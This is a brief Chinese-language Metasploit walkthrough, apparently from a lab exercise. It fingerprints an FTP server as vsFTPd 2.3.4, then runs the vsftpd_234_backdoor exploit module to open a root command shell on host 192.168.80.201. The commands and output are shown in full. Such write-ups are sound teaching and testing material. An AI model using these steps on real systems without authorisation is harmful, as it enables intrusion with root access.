# Metasploit渗透ftp

## search

```shell
msf5 auxiliary(scanner/ssh/ssh_login) > search ftp_version

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/ftp/ftp_version                   normal  No     FTP Version Scanner

```

使用`ftp_version`模块查找指定主机的ftp版本号，通过版本号查询具体的攻击模块

```shell
msf5 auxiliary(scanner/ftp/ftp_version) > show options 

Module options (auxiliary/scanner/ftp/ftp_version):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT    21                   yes       The target port (TCP)
   THREADS  1                    yes       The number of concurrent threads (max one per host)

msf5 auxiliary(scanner/ftp/ftp_version) > set rhosts 192.168.80.201
rhosts => 192.168.80.201
msf5 auxiliary(scanner/ftp/ftp_version) > run

[+] 192.168.80.201:21     - FTP Banner: '220 (vsFTPd 2.3.4)\x0d\x0a'
[*] 192.168.80.201:21     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ftp/ftp_version) > 

```

这里可以知道ftp版本为2.3.4

## run

通过`search 2.3.4 type:exploit` 来查找对应的exploit模块。`use exploit/unix/ftp/vsftpd_234_backdoor`

```shell
sf5 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 192.168.80.201
rhosts => 192.168.80.201
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.168.80.201:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.80.201:21 - USER: 331 Please specify the password.
[+] 192.168.80.201:21 - Backdoor service has been spawned, handling...
[+] 192.168.80.201:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 4 opened (0.0.0.0:0 -> 192.168.80.201:6200) at 2020-09-09 02:54:26 -0400
```

